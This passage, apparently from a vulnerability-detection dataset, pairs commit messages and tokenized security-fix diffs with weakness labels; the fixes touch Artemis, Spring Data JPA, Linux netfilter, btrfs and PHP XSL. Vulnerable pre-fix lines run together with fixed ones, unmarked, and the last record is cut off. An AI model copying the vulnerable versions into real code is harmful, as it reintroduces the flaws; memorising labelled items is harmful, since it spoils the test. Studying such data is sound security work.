"with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "utils", ";", "import", "io", ".", "netty", ".", "buffer", ".", "ByteBuf", ";", "import", "io", ".", "netty", ".", "buffer", ".", "ByteBufAllocator", ";", "import", "org", ".", "apache", ".", "activemq", ".", "artemis", ".", "core", ".", "buffers", ".", "impl", ".", "ChannelBufferWrapper", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "public", "class", "ChannelBufferWrapperTest", "{", "@", "Test", "public", "void", "testOutOfBoundsThrownOnMalformedString", "(", ")", "{", "ByteBuf", "byteBuffer", "=", "ByteBufAllocator", ".", "DEFAULT", ".", "buffer", "(", "4", ")", ";", "byteBuffer", ".", "writeInt", "(", "100", ")", ";", "Exception", "e", "=", "null", ";", "try", "{", "ChannelBufferWrapper", "cbw", "=", "new", "ChannelBufferWrapper", "(", "byteBuffer", ")", ";", "cbw", ".", "readSimpleString", "(", ");", "}", "catch", "(", "IndexOutOfBoundsException", "iob", ")", "{", "e", "=", "iob", ";", "}", "assertTrue", "(", "e", "instanceof", "IndexOutOfBoundsException", ")", ";", "}", "}"], "docstring_tokens": ["memory", "exhaustion"]}
{"contents": ["DATAJPA-1519", "-", "Final", "polishing.", "Introduced", "dedicated", "JPA", "SpEL", "root", "object", "to", "be", "able", "to", "explicitly", "control", "the", "function", "names", "exposed."], "code_tokens": ["@", "@", "-", "32", ",", "12", "+", "32", ",", "12", "@", "@", "private", "static", "final", "List", "<", "String", ">", "TO_REPLACE", "=", "Arrays", ".", "asList", "(", "\"", "_", "\"", ",", "\"", "%\"", ");", "char", "value", ";", "char", "escapeCharacter", ";", "/", "**", "*", "Escapes", "all", "special", "like", "characters", "(", "{@", "code", "_", "}", ",", "{", "@", "code", "%", "})", "using", "the", "configured", "escape", "character", ".", "*", "*", "@", "param", "value", "May", "be", "{", "@", "literal", "null", "}", ".", "*", "@", "param", "value", "may", "be", "{", "@", "literal", "null", "}", ".", "*", "@", "return", "*", "/", "public", "String", "escape", "(", "String", "value", ")", "{", "@", "@", "-", "49", ",", "18", "+", "49", ",", "9", "@", "@", "public", "String", "escape", "(", "String", "value", ")", "{", "String", "result", "=", "value", ";", "for", "(", "String", "toReplace", ":", "TO_REPLACE", ")", "{", "result", "=", "result", ".", "replace", "(", "toReplace", ",", "value", "+", "toReplace", ")", ";", "result", "=", "result", ".", "replace", "(", "toReplace", ",", "escapeCharacter", "+", "toReplace", ")", ";", "}", "return", "result", ";", "}", "/", "**", "*", "Makes", "the", "underlying", "character", "available", ".", "*", "*", "@", "return", "the", "value", "*", "/", "public", "char", "escapeCharacter", "(", ")", "{", "return", "value", ";", "}", "}", "@", "@", "-", "291", ",", "7", "+", "291", ",", "7", "@", "@", "public", "Predicate", "build", "(", ")", "{", "Expression", "<", "String", ">", "stringPath", "=", "getTypedPath", "(", "root", ",", "part", ")", ";", "Expression", "<", "String", ">", "propertyExpression", "=", "upperIfIgnoreCase", "(", "stringPath", ")", ";", "Expression", "<", "String", ">", "parameterExpression", "=", "upperIfIgnoreCase", "(", "provider", ".", "next", "(", "part", ",", "String", ".", "class", ")", ".", "getExpression", "(", "))", ";", "Predicate", "like", "=", "builder", ".", "like", "(", "propertyExpression", ",", "parameterExpression", ",", "escape", ".", "getValue", "(", "))", ";", "Predicate", "like", "=", "builder", ".", "like", "(", "propertyExpression", ",", "parameterExpression", ",", "escape", ".", "getEscapeCharacter", "(", "))", ";", "return", "type", ".", "equals", "(", "NOT_LIKE", ")", "|", "|", "type", ".", "equals", "(", "NOT_CONTAINING", ")", "?", "like", ".", "not", "(", ")", ":", "like", ";", "case", "TRUE", ":", "Expression", "<", "Boolean", ">", "truePath", "=", "getTypedPath", "(", "root", ",", "part", ")", ";", "@", "@", "-", "15", ",", "6", "+", "15", ",", "8", "@", "@", "*", "/", "package", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "support", ";", "import", "lombok", ".", "RequiredArgsConstructor", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "import", "org", ".", "springframework", ".", "data", ".", "repository", ".", "query", ".", "spi", ".", "EvaluationContextExtension", ";", "import", "org", ".", "springframework", ".", "data", ".", "repository", ".", "query", ".", "spi", ".", "EvaluationContextExtensionSupport", ";", "@", "@", "-", "27", ",", "15", "+", "29", ",", "15", "@", "@", "*", "/", "public", "class", "JpaEvaluationContextExtension", "extends", "EvaluationContextExtensionSupport", "{", "private", "final", "EscapeCharacter", "character", ";", "private", "final", "JpaRootObject", "root", ";", "/", "**", "*", "Creates", "a", "new", "{", "@", "link", "JpaEvaluationContextExtension", "}", "for", "the", "given", "escape", "character", ".", "*", "*", "@", "param", "escapeCharacter", "the", "character", "to", "be", "used", "to", "escape", "parameters", "for", "LIKE", "expression", ".", "*", "/", "public", "JpaEvaluationContextExtension", "(", "char", "escapeCharacter", ")", "{", "this", ".", "character", "=", "EscapeCharacter", ".", "of", "(", "escapeCharacter", ")", ";", "this", ".", "root", "=", "JpaRootObject", ".", "of", "(", "EscapeCharacter", ".", "of", "(", "escapeCharacter", ")", ");", "}", "/", "*", "@", "@", "-", "53", ",", "6", "+", "55", ",", "32", "@", "@", "public", "String", "getExtensionId", "(", ")", "{", "*", "/", "@", "Override", "public", "Object", "getRootObject", "(", ")", "{", "return", "character", ";", "return", "root", ";", "}", "@", "RequiredArgsConstructor", "(", "staticName", "=", "\"", "of", "\"", ")", "public", "static", "class", "JpaRootObject", "{", "private", "final", "EscapeCharacter", "character", ";", "/", "**", "*", "Escapes", "the", "given", "source", "{", "@", "link", "String", "}", "for", "LIKE", "expressions", ".", "*", "*", "@", "param", "source", "can", "be", "{", "@", "literal", "null", "}", ".", "*", "@", "return", "*", "@", "see", "EscapeCharacter", "#", "escape", "(", "String", ")", "*", "/", "public", "String", "escape", "(", "String", "source", ")", "{", "return", "character", ".", "escape", "(", "source", ")", ";", "}", "/", "**", "*", "Returns", "the", "escape", "character", "being", "used", "to", "escape", "special", "characters", "for", "LIKE", "expressions", ".", "*", "*", "@", "return", "*", "/", "public", "char", "escapeCharacter", "(", ")", "{", "return", "character", ".", "getEscapeCharacter", "(", ");", "}", "}", "}", "@", "@", "-", "51", ",", "7", "+", "51", ",", "7", "@", "@", "public", "JpaRepositoryFactoryBean", "(", "Class", "<", "?", "extends", "T", ">", "repositoryInterface", ")", "{", "}", "/", "**", "*", "Configures", "the", "escape", "character", "to", "be", "used", "to", "escape", "reserved", "characters", "for", "LIKE", "expressions", ".", "*", "Configures", "the", "escape", "character", "to", "be", "used", "to", "escape", "reserved", "characters", "in", "LIKE", "expressions", ".", "*", "*", "@", "param", "escapeCharacter", "*", "/"], "docstring_tokens": ["information", "disclosure"]}
{"contents": ["netfilter:", "nf_nat_redirect:", "add", "missing", "NULL", "pointer", "check", "Commit", "8b13eddfdf04cbfa561725cfc42d6868fe896f56", "(\"netfilter:", "refactor", "NAT", "redirect", "IPv4", "to", "use", "it", "from", "nf_tables\")", "has", "introduced", "a", "trivial", "logic", "change", "which", "can", "result", "in", "the", "following", "crash.", "BUG:", "unable", "to", "handle", "kernel", "NULL", "pointer", "dereference", "at", "0000000000000030", "IP:", "[<ffffffffa033002d>]", "nf_nat_redirect_ipv4+0x2d/0xa0", "[nf_nat_redirect]", "PGD", "3ba662067", "PUD", "3ba661067", "PMD", "0", "Oops:", "0000", "[#1]", "SMP", "Modules", "linked", "in:", "ipv6(E)", "xt_REDIRECT(E)", "nf_nat_redirect(E)", "xt_tcpudp(E)", "iptable_nat(E)", "nf_conntrack_ipv4(E)", "nf_defrag_ipv4(E)", "nf_nat_ipv4(E)", "nf_nat(E)", "nf_conntrack(E)", "ip_tables(E)", "x_tables(E)", "binfmt_misc(E)", "xfs(E)", "libcrc32c(E)", "evbug(E)", "evdev(E)", "psmouse(E)", "i2c_piix4(E)", "i2c_core(E)", "acpi_cpufreq(E)", "button(E)", "ext4(E)", "crc16(E)", "jbd2(E)", "mbcache(E)", "dm_mirror(E)", "dm_region_hash(E)", "dm_log(E)", "dm_mod(E)", "CPU:", "0", "PID:", "2536", "Comm:", "ip", "Tainted:", "G", "E", "4.1.7-15.23.amzn1.x86_64", "#1", "Hardware", "name:", "Xen", "HVM", "domU,", "BIOS", "4.2.amazon", "05/06/2015", "task:", "ffff8800eb438000", "ti:", "ffff8803ba664000", "task.ti:", "ffff8803ba664000", "[...]", "Call", "Trace:", "<IRQ>", "[<ffffffffa0334065>]", "redirect_tg4+0x15/0x20", "[xt_REDIRECT]", "[<ffffffffa02e2e99>]", "ipt_do_table+0x2b9/0x5e1", "[ip_tables]", "[<ffffffffa0328045>]", "iptable_nat_do_chain+0x25/0x30", "[iptable_nat]", "[<ffffffffa031777d>]", "nf_nat_ipv4_fn+0x13d/0x1f0", "[nf_nat_ipv4]", "[<ffffffffa0328020>]", "?", "iptable_nat_ipv4_fn+0x20/0x20", "[iptable_nat]", "[<ffffffffa031785e>]", "nf_nat_ipv4_in+0x2e/0x90", "[nf_nat_ipv4]", "[<ffffffffa03280a5>]", "iptable_nat_ipv4_in+0x15/0x20", "[iptable_nat]", "[<ffffffff81449137>]", "nf_iterate+0x57/0x80", "[<ffffffff814491f7>]", "nf_hook_slow+0x97/0x100", "[<ffffffff814504d4>]", "ip_rcv+0x314/0x400", "unsigned", "int", "nf_nat_redirect_ipv4(struct", "sk_buff", "*skb,", "...", "{", "...", "rcu_read_lock();", "indev", "=", "__in_dev_get_rcu(skb->dev);", "if", "(indev", "!=", "NULL)", "{", "ifa", "=", "indev->ifa_list;", "newdst", "=", "ifa->ifa_local;", "<---", "}", "rcu_read_unlock();", "...", "}", "Before", "the", "commit,", "'ifa'", "had", "been", "always", "checked", "before", "access.", "After", "the", "commit,", "however,", "it", "could", "be", "accessed", "even", "if", "it's", "NULL.", "Interestingly,", "this", "was", "once", "fixed", "in", "2003.", "http://marc.info/?l=netfilter-devel&m=106668497403047&w=2", "In", "addition", "to", "the", "original", "one,", "we", "have", "seen", "the", "crash", "when", "packets", "that", "need", "to", "be", "redirected", "somehow", "arrive", "on", "an", "interface", "which", "hasn't", "been", "yet", "fully", "configured.", "This", "change", "just", "reverts", "the", "logic", "to", "the", "old", "behavior", "to", "avoid", "the", "crash.", "Fixes:", "8b13eddfdf04", "(\"netfilter:", "refactor", "NAT", "redirect", "IPv4", "to", "use", "it", "from", "nf_tables\")", "Signed-off-by:", "Munehisa", "Kamata", "<kamatam@amazon.com>", "Signed-off-by:", "Pablo", "Neira", "Ayuso", "<pablo@netfilter.org>"], "code_tokens": ["@", "@", "-", "55", ",", "7", "+", "55", ",", "7", "@", "@", "nf_nat_redirect_ipv4", "(", "struct", "sk_buff", "*", "skb", ",", "rcu_read_lock", "(", ");", "indev", "=", "__in_dev_get_rcu", "(", "skb", "-", ">", "dev", ")", ";", "if", "(", "indev", "!", "=", "NULL", ")", "{", "if", "(", "indev", "&", "&", "indev", "-", ">", "ifa_list", ")", "{", "ifa", "=", "indev", "-", ">", "ifa_list", ";", "newdst", "=", "ifa", "-", ">", "ifa_local", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Btrfs:", "check", "for", "read", "permission", "on", "src", "file", "in", "the", "clone", "ioctl", "The", "existing", "code", "would", "have", "allowed", "you", "to", "clone", "a", "file", "that", "was", "only", "open", "for", "writing", "Signed-off-by:", "Chris", "Mason", "<chris.mason@oracle.com>"], "code_tokens": ["@", "@", "-", "1480", ",", "12", "+", "1480", ",", "17", "@", "@", "static", "noinline", "long", "btrfs_ioctl_clone", "(", "struct", "file", "*", "file", ",", "unsigned", "long", "srcfd", ",", "ret", "=", "-", "EBADF", ";", "goto", "out_drop_write", ";", "}", "src", "=", "src_file", "-", ">", "f_dentry", "-", ">", "d_inode", ";", "ret", "=", "-", "EINVAL", ";", "if", "(", "src", "=", "=", "inode", ")", "goto", "out_fput", ";", "/", "*", "the", "src", "must", "be", "open", "for", "reading", "*", "/", "if", "(", "!(", "src_file", "-", ">", "f_mode", "&", "FMODE_READ", ")", ")", "goto", "out_fput", ";", "ret", "=", "-", "EISDIR", ";", "if", "(", "S_ISDIR", "(", "src", "-", ">", "i_mode", ")", "|", "|", "S_ISDIR", "(", "inode", "-", ">", "i_mode", ")", ")", "goto", "out_fput", ";"], "docstring_tokens": ["btrfs", "cloned", "file", "security", "bypass"]}
{"contents": ["Fix", "for", "bug", "#69782"], "code_tokens": ["@", "@", "-", "81", ",", "10", "+", "81", ",", "10", "@", "@", "ZEND_END_ARG_INFO", "(", ");", "/", "*", "}", "}}", "*", "/", "/", "*", "*", "class", "xsl_xsltprocessor", "*", "class", "xsl_xsltprocessor", "*", "*", "URL", ":", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "TR", "/", "2003", "/", "WD", "-", "DOM", "-", "Level", "-", "3", "-", "Core", "-", "20030226", "/", "DOM3", "-", "Core", ".", "html", "#", "*", "Since", ":", "*", "Since", ":", "*", "/", "const", "zend_function_entry", "php_xsl_xsltprocessor_class_functions", "[", "]", "=", "{", "@", "@", "-", "111", ",", "9", "+", "111", ",", "9", "@", "@", "static", "char", "*", "php_xsl_xslt_string_to_xpathexpr", "(", "const", "char", "*", "str", "TSRMLS_DC", ")", "xmlChar", "*", "value", ";", "int", "str_len", ";", "str_len", "=", "xmlStrlen", "(", "string", ")", "+", "3", ";", "if", "(", "xmlStrchr", "(", "string", ",", "'", "\"'", "))", "{", "if", "(", "xmlStrchr", "(", "string", ",", "'", "\\'", "')", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Cannot", "create", "XPath", "expression", "(", "string", "contains", "both", "quote", "and", "double", "-", "quotes", ")", "\")", ";", "@", "@", "-", "133", ",", "7", "+", "133", ",", "7", "@", "@", "static", "char", "*", "php_xsl_xslt_string_to_xpathexpr", "(", "const", "char", "*", "str", "TSRMLS_DC", ")", "Translates", "a", "PHP", "array", "to", "a", "libxslt", "parameters", "array", "*", "/", "static", "char", "*", "*", "php_xsl_xslt_make_params", "(", "HashTable", "*", "parht", ",", "int", "xpath_params", "TSRMLS_DC", ")", "{", "int", "parsize", ";", "zval", "*", "*", "value", ";", "char", "*", "xpath_expr", ",", "*", "string_key", "=", "NULL", ";", "@", "@", "-", "158", ",", "7", "+", "158", ",", "7", "@", "@", "static", "char", "*", "*", "php_xsl_xslt_make_params", "(", "HashTable", "*", "parht", ",", "int", "xpath_params", "TSRMLS", "SEPARATE_ZVAL", "(", "value", ")", ";", "convert_to_string", "(", "*", "value", ")", ";", "}", "if", "(", "!", "xpath_params", ")", "{", "xpath_expr", "=", "php_xsl_xslt_string_to_xpathexpr", "(", "Z_STRVAL_PP", "(", "value", ")", "TSRMLS_CC", ")", ";", "}", "else", "{", "@", "@", "-", "192", ",", "7", "+", "192", ",", "7", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "char", "*", "str", ";", "char", "*", "callable", "=", "NULL", ";", "xsl_object", "*", "intern", ";", "TSRMLS_FETCH", "(", ");", "if", "(", "!", "zend_is_executing", "(", "TSRMLS_C", ")", ")", "{", "@", "@", "-", "219", ",", "15", "+", "219", ",", "17", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "}", "}", "}", "if", "(", "error", "=", "=", "1", ")", "{", "for", "(", "i", "=", "nargs", "-", "1", ";", "i", ">", "=", "0", ";", "i", "-", "-)", "{", "obj", "=", "valuePop", "(", "ctxt", ")", ";", "xmlXPathFreeObject", "(", "obj", ")", ";", "if", "(", "obj", ")", "{", "xmlXPathFreeObject", "(", "obj", ")", ";", "}", "}", "return", ";", "}", "fci", ".", "param_count", "=", "nargs", "-", "1", ";", "if", "(", "fci", ".", "param_count", ">", "0", ")", "{", "fci", ".", "params", "=", "safe_emalloc", "(", "fci", ".", "param_count", ",", "sizeof", "(", "zval", "*", "*)", ",", "0", ")", ";", "@", "@", "-", "265", ",", "7", "+", "267", ",", "7", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "if", "(", "node", "-", ">", "type", "=", "=", "XML_NAMESPACE_DECL", ")", "{", "xmlNsPtr", "curns", ";", "xmlNodePtr", "nsparent", ";", "nsparent", "=", "node", "-", ">", "_private", ";", "curns", "=", "xmlNewNs", "(", "NULL", ",", "node", "-", ">", "name", ",", "NULL", ")", ";", "if", "(", "node", "-", ">", "children", ")", "{", "@", "@", "-", "297", ",", "14", "+", "299", ",", "16", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "xmlXPathFreeObject", "(", "obj", ")", ";", "fci", ".", "params", "[", "i", "]", "=", "&", "args", "[", "i", "]", ";", "}", "fci", ".", "size", "=", "sizeof", "(", "fci", ")", ";", "fci", ".", "function_table", "=", "EG", "(", "function_table", ")", ";", "obj", "=", "valuePop", "(", "ctxt", ")", ";", "if", "(", "obj", "-", ">", "stringval", "=", "=", "NULL", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Handler", "name", "must", "be", "a", "string", "\"", ");", "xmlXPathFreeObject", "(", "obj", ")", ";", "if", "(", "obj", "=", "=", "NULL", "|", "|", "obj", "-", ">", "stringval", "=", "=", "NULL", ")", "{", "if", "(", "obj", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Handler", "name", "must", "be", "a", "string", "\"", ");", "xmlXPathFreeObject", "(", "obj", ")", ";", "}", "valuePush", "(", "ctxt", ",", "xmlXPathNewString", "(", "\"\"", "))", ";", "if", "(", "fci", ".", "param_count", ">", "0", ")", "{", "for", "(", "i", "=", "0", ";", "i", "<", "nargs", "-", "1", ";", "i", "+", "+)", "{", "@", "@", "-", "313", ",", "12", "+", "317", ",", "12", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "efree", "(", "args", ")", ";", "efree", "(", "fci", ".", "params", ")", ";", "}", "return", ";", "return", ";", "}", "INIT_PZVAL", "(", "&", "handler", ")", ";", "ZVAL_STRING", "(", "&", "handler", ",", "obj", "-", ">", "stringval", ",", "1", ")", ";", "xmlXPathFreeObject", "(", "obj", ")", ";", "fci", ".", "function_name", "=", "&", "handler", ";", "fci", ".", "symbol_table", "=", "NULL", ";", "fci", ".", "object_ptr", "=", "NULL", ";", "@", "@", "-", "328", ",", "7", "+", "332", ",", "7", "@", "@", "static", "void", "xsl_ext_function_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ",", "int", "t", "if", "(", "!", "zend_make_callable", "(", "&", "handler", ",", "&", "callable", "TSRMLS_CC", ")", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Unable", "to", "call", "handler", "%", "s", "(", ")\"", ",", "callable", ")", ";", "valuePush", "(", "ctxt", ",", "xmlXPathNewString", "(", "\"\"", "))", ";", "}", "else", "if", "(", "intern", "-", ">", "registerPhpFunctions", "=", "=", "2", "&", "&", "zend_hash_exists", "(", "intern", "-", ">", "registered_phpfunctions", ",", "callable", ",", "strlen", "(", "callable", ")", "+", "1", ")", "=", "=", "0", ")", "{", "}", "else", "if", "(", "intern", "-", ">", "registerPhpFunctions", "=", "=", "2", "&", "&", "zend_hash_exists", "(", "intern", "-", ">", "registered_phpfunctions", ",", "callable", ",", "strlen", "(", "callable", ")", "+", "1", ")", "=", "=", "0", ")", "{", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "Not", "allowed", "to", "call", "handler", "'", "%", "s", "(", ")'", "\",", "callable", ")", ";", "/", "*", "Push", "an", "empty", "string", ",", "so", "that", "we", "at", "least", "have", "an", "xslt", "result", ".", "..", "*", "/", "valuePush", "(", "ctxt", ",", "xmlXPathNewString", "(", "\"\"", "))", ";", "@", "@", "-", "392", ",", "7", "+", "396", ",", "7", "@", "@", "void", "xsl_ext_function_object_php", "(", "xmlXPathParserContextPtr", "ctxt", ",", "int", "nargs", ")", "/", "*", "{", "{", "/", "*", "{", "{{", "proto", "void", "xsl_xsltprocessor_import_stylesheet", "(", "domdocument", "doc", ")", ";", "URL", ":", "http", ":", "//", "www", ".", "w3", ".", "org", "/", "TR", "/", "2003", "/", "WD", "-", "DOM", "-", "Level", "-", "3", "-", "Core", "-", "20030226", "/", "DOM3", "-", "Core", ".", "html", "#", "Since", ":", "Since", ":", "*", "/", "PHP_FUNCTION", "(", "xsl_xsltprocessor_import_stylesheet", ")", "{", "@", "@", "-", "404", ",", "13", "+", "408", ",", "13", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_import_stylesheet", ")", "xmlNode", "*", "nodep", "=", "NULL", ";", "zend_object_handlers", "*", "std_hnd", ";", "zval", "*", "cloneDocu", ",", "*", "member", ";", "if", "(", "zend_parse_method_parameters", "(", "ZEND_NUM_ARGS", "(", ")", "TSRMLS_CC", ",", "getThis", "(", "),", "\"", "Oo", "\"", ",", "&", "id", ",", "xsl_xsltprocessor_class_entry", ",", "&", "docp", ")", "=", "=", "FAILURE", ")", "{", "RETURN_FALSE", ";", "}", "nodep", "=", "php_libxml_import_node", "(", "docp", "TSRMLS_CC", ")", ";", "if", "(", "nodep", ")", "{", "doc", "=", "nodep", "-", ">", "doc", ";", "}", "@", "@", "-", "419", ",", "7", "+", "423", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_import_stylesheet", ")", "RETURN_FALSE", ";", "}", "/", "*", "libxslt", "uses", "_private", ",", "so", "we", "must", "copy", "the", "imported", "/", "*", "libxslt", "uses", "_private", ",", "so", "we", "must", "copy", "the", "imported", "stylesheet", "document", "otherwise", "the", "node", "proxies", "will", "be", "a", "mess", "*", "/", "newdoc", "=", "xmlCopyDoc", "(", "doc", ",", "1", ")", ";", "xmlNodeSetBase", "(", "(", "xmlNodePtr", ")", "newdoc", ",", "(", "xmlChar", "*", ")", "doc", "-", ">", "URL", ")", ";", "@", "@", "-", "436", ",", "7", "+", "440", ",", "7", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_import_stylesheet", ")", "RETURN_FALSE", ";", "}", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "intern", "=", "(", "xsl_object", "*", ")", "zend_object_store_get_object", "(", "id", "TSRMLS_CC", ")", ";", "std_hnd", "=", "zend_get_std_object_handlers", "(", ");", "MAKE_STD_ZVAL", "(", "member", ")", ";", "@", "@", "-", "463", ",", "10", "+", "467", ",", "10", "@", "@", "PHP_FUNCTION", "(", "xsl_xsltprocessor_import_stylesheet", ")", "intern", "-", ">", "hasKeys", "=", "clone_docu", ";", "}", "if", "(", "(", "oldsheetp", "=", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", ")", "{", "if", "(", "(", "oldsheetp", "=", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", ")", "{", "/", "*", "free", "wrapper", "*", "/", "if", "(", "((", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", "->", "_private", "!", "=", "NULL", ")", "{", "(", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", "->", "_private", "=", "NULL", ";", "(", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", "->", "_private", "=", "NULL", ";", "}", "xsltFreeStylesheet", "(", "(", "xsltStylesheetPtr", ")", "intern", "-", ">", "ptr", ")", ";", "intern", "-", ">", "ptr", "=", "NULL", ";", "@", "@", "-", "494", ",", "7", "+", "498", ",", "7", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "xsltSecurityPrefsPtr", "secPrefs", "=", "NULL", ";", "node", "=", "php_libxml_import_node", "(", "docp", "TSRMLS_CC", ")", ";", "if", "(", "node", ")", "{", "doc", "=", "node", "-", ">", "doc", ";", "}", "@", "@", "-", "507", ",", "7", "+", "511", ",", "7", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "php_error_docref", "(", "NULL", "TSRMLS_CC", ",", "E_WARNING", ",", "\"", "No", "stylesheet", "associated", "to", "this", "object", "\"", ");", "return", "NULL", ";", "}", "if", "(", "intern", "-", ">", "profiling", ")", "{", "if", "(", "php_check_open_basedir", "(", "intern", "-", ">", "profiling", "TSRMLS_CC", ")", ")", "{", "f", "=", "NULL", ";", "@", "@", "-", "517", ",", "7", "+", "521", ",", "7", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "}", "else", "{", "f", "=", "NULL", ";", "}", "if", "(", "intern", "-", ">", "parameter", ")", "{", "params", "=", "php_xsl_xslt_make_params", "(", "intern", "-", ">", "parameter", ",", "0", "TSRMLS_CC", ")", ";", "}", "@", "@", "-", "549", ",", "7", "+", "553", ",", "7", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "efree", "(", "member", ")", ";", "secPrefsValue", "=", "intern", "-", ">", "securityPrefs", ";", "/", "*", "This", "whole", "if", "block", "can", "be", "removed", ",", "when", "we", "remove", "the", "xsl", ".", "security_prefs", "php", ".", "ini", "option", "in", "PHP", "6", "+", "*", "/", "secPrefsIni", "=", "INI_INT", "(", "\"", "xsl", ".", "security_prefs", "\"", ");", "/", "*", "if", "secPrefsIni", "has", "the", "same", "value", "as", "secPrefsValue", ",", "all", "is", "fine", "*", "/", "@", "@", "-", "569", ",", "38", "+", "573", ",", "38", "@", "@", "static", "xmlDocPtr", "php_xsl_apply_stylesheet", "(", "zval", "*", "id", ",", "xsl_object", "*", "intern", ",", "xsltStyl", "/", "*", "if", "securityPrefs", "is", "set", "to", "NONE", ",", "we", "don", "'", "t", "have", "to", "do", "any", "checks", ",", "but", "otherwise", ".", "..", "*", "/", "if", "(", "secPrefsValue", "!", "=", "XSL_SECPREF_NONE", ")", "{", "secPrefs", "=", "xsltNewSecurityPrefs", "(", ");", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_READ_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefs", "=", "xsltNewSecurityPrefs", "(", ");", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_READ_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_WRITE_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_WRITE_FILE", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_WRITE_FILE", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_CREATE_DIRECTORY", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_CREATE_DIRECTORY", ",", "xsltSecurityForbid", ")", ")", "{", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_CREATE_DIRECTORY", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_CREATE_DIRECTORY", ",", "xsltSecurityForbid", ")", ")", "{", "secPrefsError", "=", "1", ";", "}", "}", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_READ_NETWORK", ")", "{", "if", "(", "0", "!", "=", "xsltSetSecurityPrefs", "(", "secPrefs", ",", "XSLT_SECPREF_READ_NETWORK", ",", "xsltSecurityForbid", ")", ")", "{", "if", "(", "secPrefsValue", "&", "XSL_SECPREF_READ_NETWORK", ")", "{", "if", "(", "0", "!", "=", 